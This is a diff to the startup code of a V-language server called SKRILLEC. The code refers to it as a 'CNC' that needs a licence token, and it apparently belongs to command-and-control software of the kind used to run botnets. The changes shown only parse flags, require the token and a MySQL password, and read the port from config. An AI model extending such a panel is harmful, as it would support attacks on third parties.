@@ -38,12 +38,11 @@ fn main() {
 	
 	// Command Parsing 
 	mut cmd_args := os.args.clone()
-	for i, v in cmd_args {
-		if v == "--help" { print("${config.Help_MENU}\r\n") exit(0) }
-		// if v == ""
-		if v == "-p" { svr.set_port(cmd_args[i+1]) }
-
-		if v == "-sqlpw" { svr.sqlconn.password = cmd_args[i+1] }
+	for i, v in cmd_args { // Command Handler
+		if v == "--help" { print("${config.Help_MENU}\r\n") exit(0) } // Help Menu
+		if v == "-p" { svr.set_port(cmd_args[i+1]) } // Setting Port If Found!
+		if v == "-sqlpw" { svr.sqlconn.password = cmd_args[i+1] } // Setting MySQL PW
+		if v == "-t" { svr.cnc_key = cmd_args[i+1] } // Setting SKRILLEC License Key
 
 		if v == "-reset_config" {
 			if cmd_args[i+1] == "MySQL" {
@@ -55,19 +54,28 @@ fn main() {
 			}
 		}
 
-		// if v == ""
 	}
 
-	if (svr.sqlconn.password).len == 0 {
+	if svr.cnc_key.len == 0 {
+		print("[x] Error, Unable to start the CNC without a token!")
+		exit(0)
+	}
+
+	if (svr.sqlconn.password).len == 0 { // MySQL password can only be received this way
 		print("[x] Error, Unable to start the server without MySQL password. Use -sqlpw flag to set the password or --help for help!\r\n")
 		exit(0)
 	}
 
-	if svr.port.len == 0 {
+	if svr.port.len == 0 { // If the port wasnt given on the boot up command then look for port in config file
 		print("[x] Warning. No port was provided. Looking through config file for port.........!\r\n")
-		exit(0)
+		port := utils.grab_port()
+		if port == "" {
+			print("[x] Error, No port was found in the config file. You can add the port setting to the config file or use '-p' flag to set the port. Use --help for more help!\r\n")
+			exit(0)
+		}
+		svr.set_port(port)
 	}
 
 	go server.start_skrillec(mut &svr)
 	skrillec_cp.main_cp()
-}
+} 
